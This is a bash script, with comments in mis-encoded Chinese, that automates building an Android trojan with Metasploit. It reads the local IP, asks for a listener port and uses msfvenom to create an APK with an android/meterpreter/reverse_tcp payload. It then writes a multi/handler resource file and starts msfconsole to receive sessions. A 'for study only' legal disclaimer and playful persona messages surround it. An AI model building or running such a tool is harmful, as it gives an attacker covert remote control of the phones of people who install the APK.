#!/bin/bash
# ============================================================================
# @author é’Ÿæ™ºå¼º
# @email johnmelodymel@qq.com
#
# ============================================================================
# == é‡è¦å£°æ˜Ž ==
# ============================================================================
# æœ¬ç¨‹åºä»…ä¾›å­¦ä¹ å’ŒæŠ€æœ¯ç ”ç©¶ä½¿ç”¨ï¼Œç¦æ­¢å°†å…¶ç”¨äºŽä»»ä½•æœªèŽ·æŽˆæƒçš„ä¾µå…¥ã€
# æ”»å‡»ã€ç›‘å¬ã€å¹²æ‰°æˆ–å…¶ä»–è¿åç½‘ç»œå®‰å…¨å’Œéšç§ä¿æŠ¤çš„è¡Œä¸ºã€‚
#
# ä½¿ç”¨è€…å¿…é¡»åœ¨**å®Œå…¨ç†è§£å¹¶åŒæ„ä¸Šè¿°æ¡æ¬¾**çš„å‰æä¸‹ä½¿ç”¨æœ¬ç¨‹åºã€‚
# ä»»ä½•å°†æœ¬ç¨‹åºç”¨äºŽ**éžæ³•ç›®çš„**çš„è¡Œä¸ºï¼Œå…¶**æ‰€æœ‰åŽæžœ**ï¼ˆåŒ…æ‹¬ä½†ä¸é™äºŽ
# è¡Œæ”¿å¤„ç½šã€æ°‘äº‹èµ”å¿ã€åˆ‘äº‹è´£ä»»ï¼‰**å‡ç”±ä½¿ç”¨è€…è‡ªè¡Œæ‰¿æ‹…**ã€‚
#
# è¯·åŠ¡å¿…éµå®ˆæ‚¨æ‰€åœ¨å›½å®¶å’Œåœ°åŒºçš„ç›¸å…³æ³•å¾‹æ³•è§„ï¼Œç‰¹åˆ«æ˜¯ä»¥ä¸‹ä¸­å›½æ³•å¾‹æ¡æ¬¾ï¼š
#
# - ã€Šä¸­åŽäººæ°‘å…±å’Œå›½ç½‘ç»œå®‰å…¨æ³•ã€‹ ç¬¬åäºŒæ¡ï¼šä»»ä½•ä¸ªäººå’Œç»„ç»‡ä¸å¾—åˆ©ç”¨ç½‘ç»œ
#   ä»Žäº‹å±å®³å›½å®¶å®‰å…¨ã€è£èª‰å’Œåˆ©ç›Šï¼Œç…½åŠ¨é¢ è¦†å›½å®¶æ”¿æƒç­‰è¿æ³•çŠ¯ç½ªæ´»åŠ¨ã€‚
# - ã€Šä¸­åŽäººæ°‘å…±å’Œå›½åˆ‘æ³•ã€‹ ç¬¬äºŒç™¾å…«åäº”æ¡è‡³ç¬¬äºŒç™¾å…«åä¸ƒæ¡ï¼š
#   éžæ³•ä¾µå…¥è®¡ç®—æœºä¿¡æ¯ç³»ç»Ÿã€ç ´åç³»ç»ŸåŠŸèƒ½æˆ–æ•°æ®çš„è¡Œä¸ºå°†è¢«è¿½ç©¶åˆ‘äº‹è´£ä»»ã€‚
# - ã€Šä¸­åŽäººæ°‘å…±å’Œå›½æ•°æ®å®‰å…¨æ³•ã€‹ ç¬¬ä¸‰æ¡ã€ç¬¬åä¸ƒæ¡ï¼š
#   ä»Žäº‹æ•°æ®å¤„ç†æ´»åŠ¨åº”å½“ä¾æ³•ä¿éšœæ•°æ®å®‰å…¨ï¼Œç¦æ­¢éžæ³•èŽ·å–ã€æ³„éœ²æ•°æ®ã€‚
#
# ðŸ’¡ç‰¹åˆ«æé†’ï¼šæœ¬ç¨‹åºè®¾è®¡ä¸­å¯èƒ½æ¶‰åŠç½‘ç»œé€šä¿¡ã€æ•°æ®æ”¶é›†ã€è¿œç¨‹æŽ§åˆ¶ç­‰åŠŸèƒ½ï¼Œ
# å‡åº”åœ¨**æŽˆæƒèŒƒå›´å†…**ä½¿ç”¨ï¼Œä»»ä½•å¯¹è®¾å¤‡ã€ç³»ç»Ÿã€æ•°æ®çš„æœªç»æŽˆæƒçš„è®¿é—®æˆ–æŽ§åˆ¶
# éƒ½å±žäºŽè¿æ³•è¡Œä¸ºã€‚
#
# ðŸ“› è¿åä»¥ä¸Šæ¡æ¬¾é€ æˆçš„ä¸€åˆ‡æ³•å¾‹åŽæžœä¸Žè´£ä»»ï¼Œä¸Žä½œè€…æ— å…³ã€‚
#
# ============================================================================

# ðŸ›¡ï¸ æ£€æŸ¥ Metasploit æ˜¯å¦å®‰è£…
if ! command -v msfvenom >/dev/null 2>&1 || ! command -v msfconsole >/dev/null 2>&1; then
    echo -e "\033[1;31m[é”™è¯¯]ðŸ’¥ çµå„¿æ£€æµ‹åˆ°ä½ æ²¡æœ‰å®‰è£… Metasploit Frameworkï¼\033[0m"
    echo -e "\033[1;33m[æç¤º]ðŸ‘‰ è¯·å…ˆå®‰è£… Metasploitï¼Œæˆ–è€…æ£€æŸ¥ PATH è®¾ç½®ã€‚\033[0m"
    echo -e "\033[1;36må®‰è£…å‘½ä»¤æŽ¨èï¼š\033[0m \033[1;32msudo apt install metasploit-framework\033[0m"
    exit 1
fi

# èŽ·å–æœ¬åœ°å†…ç½‘IPä½œä¸ºé»˜è®¤ç›‘å¬IPï¼ŒèŒèŒå“’çµå„¿å¸®ä½ æ‹¿äº†~ ðŸŒ¸
default_ip=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -vE '127.0.0.1|::1' | awk '{print $2}' | head -n1)

# å°å‡½æ•°ï¼šå½©è‰²æç¤ºï¼Œçµå„¿å¸®ä½ ç¾Žç¾Žå“’æç¤º
function print_prompt() {
    echo "\033[1;35m[0xLing] ðŸ’¡ çµå„¿æç¤ºï¼šè¯·è¾“å…¥ \033[1;33m$1\033[0m ï¼ˆ$2ï¼‰ï¼š"
}

# è¯¢é—®ç›‘å¬IPï¼Œé»˜è®¤æ˜¯æœ¬æœºIP
print_prompt "ç›‘å¬IP" "é»˜è®¤ $default_ip"
read ip_addr
ip_addr=${ip_addr:-$default_ip}

# è¯¢é—®ç›‘å¬ç«¯å£ï¼Œé»˜è®¤4444
print_prompt "ç›‘å¬ç«¯å£" "é»˜è®¤ 4444"
read port
port=${port:-4444}

filename="ling_shell"

echo "\033[1;35m[0xLing] ðŸ’– çµå„¿æç¤ºï¼šæ­£åœ¨èŒèŒå“’ç”Ÿæˆæœ¨é©¬ APKï¼Œè¯·ç¨ç­‰å“¦~ ðŸ’«...\033[0m"
sudo msfvenom -p android/meterpreter/reverse_tcp LHOST="$ip_addr" LPORT="$port" -o "${filename}.apk"
if [[ $? -ne 0 ]]; then
    echo "\033[1;31m[å¤±è´¥] (â•¥ï¹â•¥) å“Žå‘€ï¼Œæœ¨é©¬ APK ç”Ÿæˆå¤±è´¥äº†ï¼Œçµå„¿å¥½ä¼¤å¿ƒï¼Œè„šæœ¬é€€å‡ºå•¦~ \033[0m"
    exit 1
fi

echo "\033[1;32m[æˆåŠŸ] (ã¥ï½¡â—•â€¿â€¿â—•ï½¡)ã¥ æœ¨é©¬ APK ç”Ÿæˆå®Œæ¯•å•¦ï¼Œå¿«æŽ¥æ”¶æˆ‘çš„çˆ±å¿ƒï¼š${filename}.apk ðŸ’–\033[0m"

cat >"${filename}.rc" <<EOF
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST $ip_addr
set LPORT $port
set ExitOnSession false
exploit -j
EOF

echo "\033[1;32m[æˆåŠŸ] (ï¼¾â–½ï¼¾) è„šæœ¬ç”Ÿæˆå®Œæˆï¼æ–‡ä»¶åæ˜¯ï¼š${filename}.rc âœ¨"
echo "\033[1;35m[0xLing] ðŸŒ¸ çµå„¿æ¸©é¦¨æç¤ºï¼šé©¬ä¸Šå¯åŠ¨ç›‘å¬å™¨(msfconsole)ï¼ŒæŽ¥æ”¶çˆ±çš„å°å°¾å·´~ ðŸ’•\033[0m"

sudo msfconsole -r "${filename}.rc"
